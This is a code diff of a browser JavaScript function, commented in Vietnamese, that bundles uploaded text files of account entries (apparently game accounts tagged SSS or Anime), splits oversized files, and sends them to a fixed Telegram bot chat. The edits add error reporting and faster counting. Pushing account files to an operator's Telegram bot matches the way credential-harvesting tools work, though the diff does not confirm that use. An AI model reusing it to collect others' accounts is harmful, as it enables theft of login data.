@@ -1236,62 +1236,47 @@ async function sendToTelegram() {
 async function sendFilesToTelegram(files) {
   const TELE_MAX_BYTES = 49 * 1024 * 1024; // 49MB giới hạn Telegram
 
-  // Chia text thành các chunks, mỗi chunk KHÔNG vượt maxBytes (tính theo UTF-8 Blob thực tế)
+  // Chia text thành các chunks, mỗi chunk KHÔNG vượt maxBytes
   function splitTextIntoChunks(text, maxBytes) {
     const enc = new TextEncoder();
-    // Tách theo 1+ dòng trống (giữ nguyên block AC)
     const blocks = text.split(/\n\n+/);
     const chunks = [];
     let curBlocks = [];
     let curBytes = 0;
 
     for (const block of blocks) {
-      if (!block.trim()) continue; // bỏ block rỗng
-      // +2 cho '\n\n' giữa các block
+      if (!block.trim()) continue;
       const blockBytes = enc.encode(block).length + 2;
 
-      // Nếu 1 block đơn lẻ đã > maxBytes → bắt buộc gửi riêng từng dòng
       if (blockBytes > maxBytes) {
-        // Flush chunk hiện tại trước
-        if (curBlocks.length > 0) {
-          chunks.push(curBlocks.join('\n\n'));
-          curBlocks = []; curBytes = 0;
-        }
-        // Chia block to theo từng dòng
+        if (curBlocks.length > 0) { chunks.push(curBlocks.join('\n\n')); curBlocks = []; curBytes = 0; }
         const lines = block.split('\n');
-        let lineGroup = [];
-        let lineBytes = 0;
+        let lineGroup = [], lineBytes = 0;
         for (const line of lines) {
-          const lb = enc.encode(line).length + 1; // +1 cho '\n'
+          const lb = enc.encode(line).length + 1;
           if (lineBytes + lb > maxBytes && lineGroup.length > 0) {
-            chunks.push(lineGroup.join('\n'));
-            lineGroup = []; lineBytes = 0;
+            chunks.push(lineGroup.join('\n')); lineGroup = []; lineBytes = 0;
           }
-          lineGroup.push(line);
-          lineBytes += lb;
+          lineGroup.push(line); lineBytes += lb;
         }
         if (lineGroup.length > 0) chunks.push(lineGroup.join('\n'));
         continue;
       }
 
       if (curBytes + blockBytes > maxBytes && curBlocks.length > 0) {
-        // Chunk đầy → lưu lại và bắt đầu chunk mới
-        chunks.push(curBlocks.join('\n\n'));
-        curBlocks = []; curBytes = 0;
+        chunks.push(curBlocks.join('\n\n')); curBlocks = []; curBytes = 0;
       }
-      curBlocks.push(block);
-      curBytes += blockBytes;
+      curBlocks.push(block); curBytes += blockBytes;
     }
     if (curBlocks.length > 0) chunks.push(curBlocks.join('\n\n'));
     return chunks;
   }
 
-  // Tạo Blob UTF-8 và kiểm tra kích thước thực
   function makeBlob(text) {
     return new Blob([text], { type: 'text/plain;charset=utf-8' });
   }
 
-  // Gửi 1 blob document lên Telegram
+  // FIX: throw nếu Telegram trả về lỗi thay vì âm thầm bỏ qua
   async function sendDocBlob(blob, filename, caption) {
     const form = new FormData();
     form.append('chat_id', TELE_CHAT_ID);
@@ -1300,74 +1285,71 @@ async function sendFilesToTelegram(files) {
     const res = await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendDocument`, {
       method: 'POST', body: form
     });
-    return res.json();
+    const d = await res.json();
+    if (!d.ok) throw new Error(d.description || 'Telegram API error');
+    return d;
   }
 
-  // Gửi tin nhắn text
   async function sendMsg(text) {
-    return fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
+    const res = await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TELE_CHAT_ID, text })
     });
+    const d = await res.json();
+    if (!d.ok) console.warn('sendMsg failed:', d.description);
+    return d;
   }
 
   try {
-    // Đọc tất cả file 1 lần duy nhất
     const texts = await Promise.all(files.map(f => f.text()));
     const raw = texts.join('\n\n');
 
-    const parsedACs = parseACs(raw);
-    const totalACC = parsedACs.length;
-    const totalSSS = parsedACs.filter(ac => (ac.sssCount || 0) > 0).length;
-    const totalAnime = parsedACs.filter(ac => (ac.animeCount || 0) > 0).length;
-    const enc = new TextEncoder();
+    // FIX: Đếm nhanh bằng regex thay vì parseACs(raw) synchronous
+    // parseACs trên file 200MB+ sẽ treo browser → crash âm thầm → không gửi được file
+    const rawBlocks = raw.split(/\n\n+/).filter(b => b.trim().length > 20);
+    const totalACC = rawBlocks.length;
+    const totalSSS = rawBlocks.filter(b => /(?:^|\|)\s*SSS\s*[:\-]\s*[1-9]/im.test(b)).length;
+    const totalAnime = rawBlocks.filter(b => /(?:^|\|)\s*ANIME\s*[:\-]\s*[1-9]/im.test(b)).length;
 
     for (let fi = 0; fi < files.length; fi++) {
       const file = files[fi];
       const fileText = texts[fi];
-      // Tính kích thước thực UTF-8 (giống Blob)
-      const fileSizeBytes = enc.encode(fileText).length;
+      const blob = makeBlob(fileText); // FIX: dùng blob.size làm chuẩn duy nhất
+      const fileSizeBytes = blob.size;
       const baseName = file.name.replace(/\.txt$/i, '');
 
-      if (fileSizeBytes <= TELE_MAX_BYTES) {
-        // File nhỏ — gửi thẳng
-        const blob = makeBlob(fileText);
-        // Kiểm tra lại blob.size (an toàn 100%)
-        if (blob.size <= TELE_MAX_BYTES) {
+      try {
+        if (fileSizeBytes <= TELE_MAX_BYTES) {
+          // File nhỏ — gửi thẳng
           await sendDocBlob(blob, file.name,
 `📦 FILE ACC MỚI
 
 📄 File: ${file.name}
-📦 Kích thước: ${(blob.size / 1024 / 1024).toFixed(2)} MB
+📦 Kích thước: ${(fileSizeBytes / 1024 / 1024).toFixed(2)} MB
 👤 Tổng ACC: ${totalACC}
 ✨ ACC có SSS: ${totalSSS}
 🎌 ACC có Anime: ${totalAnime}
 
 🕒 ${new Date().toLocaleString('vi-VN')}`);
-        }
-      } else {
-        // File lớn — chia nhỏ chính xác theo byte thực
-        const chunks = splitTextIntoChunks(fileText, TELE_MAX_BYTES);
-
-        // Xác minh lại: nếu chunk nào vẫn > 49MB thì chia thêm
-        const safeChunks = [];
-        for (const chunk of chunks) {
-          const b = makeBlob(chunk);
-          if (b.size <= TELE_MAX_BYTES) {
-            safeChunks.push(chunk);
-          } else {
-            // Chia tiếp (trường hợp cực hiếm)
-            const sub = splitTextIntoChunks(chunk, TELE_MAX_BYTES - 1024);
-            safeChunks.push(...sub);
+        } else {
+          // File lớn — chia nhỏ
+          const chunks = splitTextIntoChunks(fileText, TELE_MAX_BYTES);
+          const safeChunks = [];
+          for (const chunk of chunks) {
+            const b = makeBlob(chunk);
+            if (b.size <= TELE_MAX_BYTES) {
+              safeChunks.push(chunk);
+            } else {
+              const sub = splitTextIntoChunks(chunk, TELE_MAX_BYTES - 1024);
+              safeChunks.push(...sub);
+            }
           }
-        }
 
-        const totalParts = safeChunks.length;
-        const sizeMB = (fileSizeBytes / 1024 / 1024).toFixed(1);
+          const totalParts = safeChunks.length;
+          const sizeMB = (fileSizeBytes / 1024 / 1024).toFixed(1);
 
-        // Thông báo trước
-        await sendMsg(
+          await sendMsg(
 `⚠️ FILE QUÁ LỚN — TỰ ĐỘNG CHIA NHỎ
 
 📄 File: ${file.name}
@@ -1379,15 +1361,19 @@ async function sendFilesToTelegram(files) {
 🎌 ACC có Anime: ${totalAnime}
 🕒 ${new Date().toLocaleString('vi-VN')}`);
 
-        // Gửi từng phần — tên file rõ ràng: phan1_trong3, phan2_trong3...
-        for (let i = 0; i < safeChunks.length; i++) {
-          const partBlob = makeBlob(safeChunks[i]);
-          const partName = `${baseName}_phan${i + 1}_trong${totalParts}.txt`;
-          const partSizeMB = (partBlob.size / 1024 / 1024).toFixed(2);
-          await sendDocBlob(partBlob, partName,
+          for (let i = 0; i < safeChunks.length; i++) {
+            const partBlob = makeBlob(safeChunks[i]);
+            const partName = `${baseName}_phan${i + 1}_trong${totalParts}.txt`;
+            const partSizeMB = (partBlob.size / 1024 / 1024).toFixed(2);
+            await sendDocBlob(partBlob, partName,
 `📄 ${file.name}
 📦 Phần ${i + 1}/${totalParts} — ${partSizeMB} MB`);
+          }
         }
+      } catch (fileErr) {
+        // FIX: báo lỗi rõ ràng lên Telegram thay vì âm thầm bỏ qua
+        console.error(`Lỗi gửi file ${file.name}:`, fileErr);
+        await sendMsg(`❌ Lỗi gửi file ${file.name}: ${fileErr.message}`).catch(() => {});
       }
     }
 
